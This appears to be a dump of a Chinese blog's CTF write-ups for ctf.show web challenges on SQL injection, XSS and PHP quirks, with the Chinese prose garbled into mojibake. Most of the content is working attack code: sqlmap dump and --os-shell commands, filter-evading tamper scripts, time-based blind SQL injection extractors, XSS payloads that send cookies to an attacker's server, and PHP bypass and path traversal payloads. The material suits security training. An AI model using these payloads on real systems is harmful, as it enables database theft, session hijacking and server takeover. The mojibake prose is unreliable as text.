--cookie=\"UM_distinctid=17ff4d2091576a-09cf5f45e352f9-113f645d-384000-17ff4d209161689; PHPSESSID=honuvgjau5711m3j9tn84hloip; ctfshow=2e0d6ee1573392a73c0cca1476342faa\" --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**205**\n\næç¤ºapié‰´æƒï¼Œå‘ç°è¯·æ±‚å‰ä¼šå…ˆå¯¹ä¸€ä¸ªurlè¿›è¡Œè°ƒç”¨\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-10 21.53.17.png)\n\nä½¿ç”¨å¦‚ä¸‹ä¸¤ä¸ªå‚æ•°\n\n```\n--safe-url è®¾ç½®åœ¨æµ‹è¯•ç›®æ ‡åœ°å€å‰è®¿é—®çš„å®‰å…¨é“¾æ¥\n--safe-freq è®¾ç½®ä¸¤æ¬¡æ³¨å…¥æµ‹è¯•å‰è®¿é—®å®‰å…¨é“¾æ¥çš„æ¬¡æ•°\n```\n\næœ€ç»ˆå‘½ä»¤~~æ‚„æ‚„æ¢è¡¨åå’Œåˆ—åçœŸçš„å¯æ¶~~\n\n```\nsqlmap -u http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/index.php --safe-url=\"http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxc -C flagv --dump\n```\n\n**206**\n\næç¤ºSQLéœ€è¦é—­åˆï¼Œ~~å½“æˆ‘sqlmapå‚»æ˜¯å§~~ï¼ŒåŒä¸Šå³å¯\n\n**207**\n\n--tamper çš„åˆä½“éªŒ\n\n[tamperæ€»ç»“](https://blog.csdn.net/whatday/article/details/54774043)\n\nä½¿ç”¨SQLMapæä¾›çš„tamperè„šæœ¬ï¼Œå¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å¼€åº”ç”¨ç¨‹åºçš„æ•æ„Ÿå­—ç¬¦è¿‡æ»¤ã€ç»•è¿‡WAFè§„åˆ™çš„é˜»æŒ¡ï¼Œç»§è€Œè¿›è¡Œæ¸—é€æ”»å‡»ï¼Œ--tamper=TAMPER åˆ©ç”¨ç»™å®šçš„è„šæœ¬è¿›è¡Œç¯¡æ”¹æ³¨å…¥æ•°æ®ï¼Œè¯¥é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨è‡ªå¸¦çš„space2comment.pyå³å¯ç»•è¿‡\n\n```\nsqlmap -u http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/index.php --safe-url=\"http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --tamper=\"space2comment.py\"\n```\n\n**208**\n\nè¿‡æ»¤äº†å°å†™çš„selectï¼Œä½†æ˜¯sqlmapä¸­æ‰€æœ‰SELECTéƒ½æ˜¯å¤§å†™ï¼ŒåŒä¸Šå³å¯\n\n```\nsqlmap -u http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/index.php --safe-url=\"http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --tamper=\"space2comment.py\"\n```\n\n**209**\n\nè¿‡æ»¤äº†ç©ºæ ¼ï¼Œ*å’Œ=ï¼Œè®²é“ç†ä½¿ç”¨bluecoat.pyå°±è¡Œï¼Œä½†æ˜¯å‡ºä¸æ¥ï¼Œåªèƒ½è‡ªå·±ç¼–å†™è„šæœ¬æ›¿æ¢äº†ï¼Œå°†ç©ºæ ¼ç”¨%09æ›¿æ¢ï¼Œ=ç”¨LIKEæ›¿æ¢\n\n```\nsqlmap -u http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx,id,tes --dump --batch --tamper web209.py\n```\n\n```python\n#web209.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += chr(0x9)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == '=':\n                retVal += chr(0x9) + 'like' + chr(0x9)\n                continue\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += chr(0x9)\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n\n```\n\n**210**\n\nå¯¹å­—ç¬¦ä¸²è¿›è¡Œbase64è§£ç åè½¬å†è§£ç ï¼Œé‚£å°±ç¼–ç åè½¬å†ç¼–ç \n\n```\nsqlmap -u http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch --tamper web210.py\n```\n\n```python\n#web210.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\nimport base64\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n\n    retVal = payload\n\n    if payload:\n        retVal=retVal.encode()\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n    return retVal.decode()\n```\n\n**211**\n\nç›¸æ¯”äºä¸Šé¢˜å¤šè¿‡æ»¤äº†ç©ºæ ¼ï¼ŒåŠ ä¸Šspace2commitè„šæœ¬å³å¯\n\n```\nsqlmap -u http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"space2commit.py,web210.py\"\n```\n\n**212**\n\nå‰ä¸¤ä¸ªåŠ èµ·æ¥\n\n```\nsqlmap -u http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**213**\n\nä¸€é”®getshellï¼Œ--os-shell\n\n```\nsqlmap -u http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --os-shell --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**214**\n\næ—¶é—´ç›²æ³¨å¼€å§‹\n\né¦–é¡µå‘ç°ç½‘ç»œæµé‡ä¸­æœ‰select.jsï¼ŒæŸ¥çœ‹ä»£ç \n\n```javascript\n\nlayui.use('element', function(){\n  var element = layui.element;\n  element.on('tab(nav)', function(data){\n    console.log(data);\n  });\n});\n\n$.ajax({\n      url:'api/',\n      dataType:\"json\",\n      type:'post',\n      data:{\n        ip:returnCitySN[\"cip\"],\n        debug:0\n      }\n\n    });\n```\n\nå‘ç°æäº¤çš„è¡¨å•ä¸­æœ‰ä¸¤ä¸ªå˜é‡ï¼Œæµ‹è¯•ä¸€ä¸‹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-12 14.27.34.png)\n\næµ‹è¯•æˆåŠŸï¼Œå¼€å§‹ç¼–å†™ä»£ç \n\n```python\nimport requests\n\nurl=\"http://7a5edb92-03ea-49ff-bd27-30b753229c99.challenge.ctf.show/api/\"\nflagchar=\"-{},qwertyuiopasdfghjklzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1 or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagx\"),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'ip': f'1 or if((substr((select group_concat(flaga) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**215**\n\nå•å¼•å·é—­åˆ\n\n```python\nimport requests\n\nurl=\"http://59e08013-c379-4607-a6bf-c11d5c4d6d6e.challenge.ctf.show/api/\"\nflagchar=\"-{},flagqwertyuiopsdhjkzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'ip': f'1\\' or if((substr((select group_concat(flagaa) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**216**\n\nbase64ç¼–ç \n\n```python\nimport requests\n\nurl=\"http://fe2f1a17-e483-4137-b85d-9fa3a6daaa18.challenge.ctf.show/api/\"\nflagchar=\"-{},ctfshowlagbde1234567890\"\nnamechar=\",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxcc\"),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'ip': f'\"MQ==\") or if((substr((select group_concat(flagaac) from ctfshow_flagxcc),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=1.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**217**\n\nsleepä¸èƒ½ç”¨äº†å•¦ï¼Œéƒ½ctfshowå®³å¾—å•¦ï¼Œæ‹œæ‰˜ï¼Œæ¢benchmark\n\n```\nimport requests\n\nurl = \"http://e7d85700-c8a1-48c2-bea8-4ead2e0976b4.challenge.ctf.show/api/\"\nflagchar = \"-{},ctfshowlagbde1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1, 1000):\n    for j in flagchar:\n        data = {\n            #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxccb\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'ip': f'1) or if(((substr((select group_concat(flagaabc) from ctfshow_flagxccb),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'debug': '1'\n        }\n        try:\n            requests.post(url=url, data=data, timeout=4)\n        except:\n            print(j, end='')\n            break\n\n```\n\n**218**\n\nbenchmarkä¹ŸğŸˆšï¸äº†ï¼Œæ¢ç¬›å¡å°”ç§¯\n\n```python\nimport requests\n\nurl = \"http://de5b41b6-9f89-4e0a-b913-7c33a143979a.challenge.ctf.show/api/\"\nflagchar = \"-{},abcdef1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor k in range(10):\n    print()\n    for i in range(1, 50):\n        for j in flagchar:\n            data = {\n                #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),1)#',\n                #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n                'ip': f'1) or if(((substr((select group_concat(flagaac) from ctfshow_flagxc),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                print(j,end=\"\")\n                break\n\n```\n\n**219**\n\nè¿‡æ»¤äº†rlikeï¼Œç¬›å¡å°”ç§¯ä¾ç„¶å¯ç”¨ï¼ŒåŒä¸Šå³å¯\n\n**220**\n\nsleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr\n\nçœŸèƒ½æ»¤ï¼Œæ¢left\n\n```\nimport requests\n\nurl = \"http://ee633dfd-4a05-4685-bbf6-1da4b5fc4d1d.challenge.ctf.show/api/\"\nflagchar = \"ctfshow-{},abde1234567890\"\nnamechar = \"flag,ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nflag=\"\"\nfor k in range(10):\n    print()\n    flag = \"\"\n    for i in range(1, 50):\n        for j in flagchar:\n            tmp=flag+j\n            data = {\n                'ip': f'1) or if((left((select flagaabcc from ctfshow_flagxcac),{i})=\\'{tmp}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                flag=tmp\n                print(j,end=\"\")\n                break\n```\n\næ—¶é—´ç›²æ³¨ï¼Œç»“æŸ\n"},{"title":"CTFshowXSS","url":"/2022/04/06/CTFshowXSS/","content":"\n**316**\n\n```\næœ€ç®€å•çš„ï¼š\n<script>document.location.href='http://æœåŠ¡å™¨IP/?x='document.cookie</script>\n```\n\n**317**\n\n```\nscriptæ²¡å¾—äº†\n<body onload=\"document.location.href='http://æœåŠ¡å™¨IP/?x='+document.cookie\"></body>\n```\n\n**318**\n\n```\nè¿‡æ»¤äº†imgæ ‡ç­¾æ‰€ä»¥åŒä¸Šå³å¯\n```\n\n"},{"title":"CTFshowPHPç‰¹æ€§","url":"/2022/04/05/CTFshowPHPç‰¹æ€§/","content":"\n**89**\n\næ•°ç»„ç»•è¿‡\n\n```\nintval()ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼\nintval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶baseè½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡varçš„integeræ•°å€¼ã€‚intval()ä¸èƒ½ç”¨äºobjectï¼Œå¦åˆ™ä¼šäº§ç”ŸE_NOTICEé”™è¯¯å¹¶è¿”å›1ã€‚\nè¯­æ³•\nint intval ( mixed $var [, int $base = 10 ] )\n```\n\n**90**\n\nåå…­è¿›åˆ¶\n\n**91**\n\n```\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n//mä»£è¡¨å¤šè¡ŒåŒ¹é…ï¼Œæ¢è¡Œç¬¦åŠ phpå³å¯\n//cmd=%0Aphp\n```\n\n**92**\n\nåŒ90\n\n**93**\n\næ»¤äº†16è¿›åˆ¶ï¼Œä½¿ç”¨8è¿›åˆ¶ç»•è¿‡\n\n```\n?num=010574\n```\n\n**94**\n\nå…¨ç­‰ç”¨å°æ•°ç»•è¿‡\n\n```\n?num=4476.01\n```\n\n**95**\n\nå°æ•°ç‚¹æ²¡äº†ï¼Œç”¨å…«è¿›åˆ¶åŠ æ­£å·ç»•è¿‡0è¿‡æ»¤\n\n```\n?num=+010574\n```\n\n**96**\n\n```\n?u=./flag.php\n```\n\n**97**\n\nmd5å¼ºç›¸ç­‰æ•°ç»„ç»•è¿‡\n\n```\na[]=1&b[]=2\n```\n\n**98**\n\nåˆ†æä»£ç \n\n```\n3.\t$_GET?$_GET=&$_POST:'flag';\n\n    if ($_GET) {\t\t\t//åªè¦æœ‰è¾“å…¥çš„getå‚æ•°\n        $_GET = &$_POST; //å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³•(ä¿®æ”¹äº†getæ–¹æ³•çš„åœ°å€)\n        \t\t\t\t// æ¯”å¦‚$_GET[a] = &$_POST[a]ï¼Œgetä¼ aæ— ä½œç”¨ï¼Œå¿…é¡»ç”¨POST\n    } else {\n        \"flag\";\n    }\n\n4ã€5è¡Œæ— ä½œç”¨\n\n6.\thighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n\n    if ($_GET['HTTP_FLAG'] == 'flag') { //éœ€è¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶å°±å¯ä»¥è¾“å‡ºflag\n        highlight_file($flag);\t\t\t//å› ä¸ºæ²¡æœ‰ctfshow{xxxxx}è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥ä¼šäº§ç”ŸæŠ¥é”™\n        \t\t\t\t\t\t\t\t//è¿›è€Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°flagå†…å®¹\n    } else {\n        highlight_file(__FILE__);\n    }\næ„é€ POST\nHTTP_FLAG=flag\nå†æ·»åŠ ä»»æ„getå‚æ•°å³å¯\n```\n\n**99**\n\n```\nin_arrayå‡½æ•°å¦‚æœä¸è®¾ç½®strictå‚æ•°ä¸ºçœŸåˆ™è¿›è¡Œè‹¥æ¯”è¾ƒï¼Œ1.php==1\npayloadï¼šn=1.php\nPOST\ncontent=ä¸€å¥è¯æœ¨é©¬\n```\n\n**100**\n\nåœ¨PHPä¸­ï¼Œ=èµ‹å€¼è¿ç®—ç¬¦ä¼˜å…ˆçº§é«˜äºandï¼Œæ‰€ä»¥è¯­å¥æ‰§è¡Œæ˜¯v0=is_numeric(v1)ï¼Œä¼ å…¥v1ä¸ºæ•°å­—å³å¯\n\n```\n?v1=1&v2=var_dump($ctfshow)&v3=;\n```\n\n**101**\n\nåå°„ç±»\n\n```php\né¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸€ä¸ªç±»çš„åå°„ï¼ˆåºŸè¯ä¹ˆä¸æ˜¯ï¼‰\nä¸‹é¢æ˜¯ä¾‹å­\nclass fuc { //å®šä¹‰ä¸€ä¸ªç±»\n static\n function ec() {\n  echo 'æˆ‘æ˜¯ä¸€ä¸ªç±»';\n }\n}\n$class=new ReflectionClass('fuc'); //å»ºç«‹ fucè¿™ä¸ªç±»çš„åå°„ç±»\n$fuc=$class->newInstance(); //ç›¸å½“äºå®ä¾‹åŒ– fuc ç±»\n$fuc->ec(); //æ‰§è¡Œ fuc é‡Œçš„æ–¹æ³•ec\n$ec=$class->getmethod('ec'); //è·å–fuc ç±»ä¸­çš„ecæ–¹æ³•\n$fuc=$class->newInstance(); //å®ä¾‹åŒ–\n$ec->invoke($fuc);   //æ‰§è¡Œec æ–¹æ³•\n```\n\n**102**\n\n```\nå…ˆè½¬base64å†è½¬16è¿›åˆ¶å®Œæˆç»•è¿‡\n```\n\n**103**\n\nåŒä¸Š\n\n**104**\n\næ²¡éªŒè¯ç›´æ¥ä¼ ä¿©ä¸€æ ·çš„å‘—\n\n**105**\n\n```PHP\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\nå¤šç§æ“ä½œæ–¹æ³•\né€šè¿‡die($error)è¾“å‡º\npayload:a=flag \nPOST: error=a\nè¿›è¡Œçš„æ“ä½œä¸º\n$a=$flag;\n$error=$a;\n\næ­¤æ—¶$a=flag{test123};$error=flag{test123};ä»è€Œè¾“å‡ºerrorä¹Ÿå°±æ˜¯è¾“å‡ºflag\né€šè¿‡die($suces)\npayload:suces=flag&flag=\nè¿›è¡Œçš„æ“ä½œä¸º\n$suces=$flag;\n\n```\n\n**106**\n\næ„é€ æ•°ç»„æˆ–å¼±ç›¸ç­‰ç»•è¿‡\n\n```\naaroZmOk\naaK1STfY\naaO8zKZF\naa3OFF9m\n```\n\n**107**\n\n```php\nparse_strå‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡\n$a=\"x=1&y=2\";\nparse_str($a,$b);\næ­¤æ—¶$b['x']ä¸º1ï¼Œ$b['y']ä¸º2\n\npaylaod:?v3=1\nPOST\nv1=flag=c4ca4238a0b923820dcc509a6f75849b\n```\n\n**108**\n\næ­£åˆ™è¡¨è¾¾å¼%00æˆªæ–­ï¼Œæ­£åˆ™è¡¨è¾¾å¼åªä¼šåŒ¹é…%00ä¹‹å‰çš„å†…å®¹\n\n```\nstrrev()//åè½¬å­—ç¬¦ä¸²\nintval()//å–æ•´æ•°\npayload:?c=a%00778\n```\n\n**109**\n\n```php\neval(\"echo new $v1($v2());\");\n//æ„é€ ä½¿å¾—v1åç§°çš„ç±»å­˜åœ¨åé¢ä»»æ„æ„é€ å³å¯\n```\n\n**110**\n\n```PHP\nFilesystemIteratorç±»çš„ä½¿ç”¨\n$a=new FilesystemIterator(getcwd());\nwhile($a->valid()){\n  echo $a->getFilename().\"\\n\";\n  $a->next();\n}\nè¿­ä»£è¾“å‡ºå½“å‰ç›®å½•ä¸‹çš„å†…å®¹\ngetcwd()//å–å¾—å½“å‰å·¥ä½œç›®å½•\n```\n\n**111**\n\nv1è¦åœ¨æ­£åˆ™ä¸­ç­‰äºctfshowï¼Œæ‰§è¡Œçš„è¯­å¥å°±æ˜¯\n\n```\n$ctfshow=&$(v2çš„å€¼);\nvar_dump($ctfshow);\nç›¸å½“äºæ‰§è¡Œäº†\nvar_dump($(v2çš„å€¼));\nä»¤v2=GLOBALSè¶…å…¨å±€å˜é‡å³å¯å°†æ‰€æœ‰å˜é‡æ‰“å°\npayload:?v1=ctfshow&v2=GLOBALS\n```\n\n**112**\n\n```\nURLäºŒæ¬¡ç¼–ç ï¼Œé¢˜ç›®ä¸­æŠŠbase64æ»¤è¿‡äº†ï¼Œå¯¹bè¿›è¡ŒäºŒæ¬¡URLç¼–ç å³å¯ï¼Œä¼ å…¥phpæ—¶è¿›è¡Œä¸€æ¬¡è§£ç ï¼Œè°ƒç”¨phpä¼ªåè®®æ—¶å†æœ‰ä¸€æ¬¡\n```\n\n**113**\n\nå‹ç¼©æµè¯»å–\n\n```\npayload:?file=compress.zlib:///var/www/html/flag.php\n```\n\n**114**\n\n```\nphp://filter\n```\n\n**115**\n\nåœ¨æ•°å­—å‰åŠ ä¸Šç©ºæ ¼ï¼Œä¹Ÿä¼šè¢«is_numericå‡½æ•°è®¤ä¸ºæ˜¯æ•°å­—\n\ntrimå‡½æ•°ä¼šè¿‡æ»¤ç©ºæ ¼ä»¥åŠ`\\n\\r\\t\\v\\0`ï¼Œä½†ä¸ä¼šè¿‡æ»¤`\\f`\n\næœ€ç»ˆpayload:urlencode(\"\\f\".36)\n\n**123**\n\n```\nPHPå˜é‡ååº”è¯¥åªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿,åŒæ—¶GETæˆ–POSTæ–¹å¼ä¼ è¿›å»çš„å˜é‡å,ä¼šè‡ªåŠ¨å°†ç©ºæ ¼ï¼Œ+ï¼Œ.ï¼Œ[è½¬æ¢ä¸º_ï¼Œä½†æ˜¯å½“æœ‰ç‰¹æ®Šå­—ç¬¦[æ—¶ï¼Œåé¢çš„å†…å®¹ä¸­å°±ä¸ä¼šæ›¿æ¢äº†\npayload:\nPOST:\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag\n```\n\n**125**\n\n```\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=var_export(get_defined_vars())\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])\n?1=flag.php\n```\n\n**126**\n\n```\n1ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹\nç¬¬ä¸€ä¸ªå‚æ•°$_SERVER['argv'][0]æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°\n2ã€webç½‘é¡µæ¨¡å¼ä¸‹\nåœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹\nè®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœ\nè¿™æ—¶å€™çš„$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™]//è¿™é‡Œçš„è¿™ä¸ªå‚æ•°å°±æ˜¯GETè¯·æ±‚ä¸­?åçš„å†…å®¹\n$argv,$argcåœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨\n```\n\n```\npayload:?$fl0g=flag_give_me;\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])\n```\n\n**127**\n\nå‰é¢çš„è‡ªåŠ¨è½¬æ¢å’¯\n\n**128**\n\n```\nå°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°\n_()==gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll\nget_defined_vars()å‡½æ•°\nget_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag\npayload: ?f1=_&f2=get_defined_vars\n```\n\n**129**\n\nç›®å½•ç©¿è¶Š\n\n```\npayload:?f=/ctfshow/../../../../var/www/html/flag.php \n```\n\n**130**\n\næ­£åˆ™/.+?ctfshow/is\n\nstripos($f, 'ctfshow') === FALSE\n\nstriposè¿”å›ä½ç½®ä»0å¼€å§‹ï¼ŒæœªæŸ¥æ‰¾åˆ°æ‰è¿”å›falseï¼Œåœ¨ä¸¥æ ¼ç›¸ç­‰ä¸­ä¸ç›¸ç­‰\n\nç›´æ¥ç»•\n\nf=ctfshow\n\n**131**\n\n[æ­£åˆ™æº¢å‡º](https://www.laruence.com/2010/06/08/1579.html)\n\nä¼ ä¸ªè¶…è¿‡ä¸€ç™¾ä¸‡é•¿åº¦çš„å­—ç¬¦å°±å¥½å•¦\n\n```\nf='kkkk'*250000+'36Dctfshow'\n#pythonçœŸå¥½ç”¨\n```\n\n**132**\n\nrobots.txtè¿›admin\n\nå¯¹äºâ€œä¸â€ï¼ˆ&&ï¼‰ è¿ç®—ï¼š x && y å½“xä¸ºfalseæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œyï¼›\n\nå¯¹äºâ€œæˆ–â€ï¼ˆ||ï¼‰ è¿ç®— ï¼š x||y å½“xä¸ºtrueæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œyã€‚\n\nåœ¨åˆ¤æ–­è¿™ä¸ªçš„æ—¶å€™if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\") ç¬¬ä¸€ä¸ª$code === mt_rand(1,0x36D)ä¸ºfalse,ä¹‹åå°±æ‰§è¡Œ|| $username 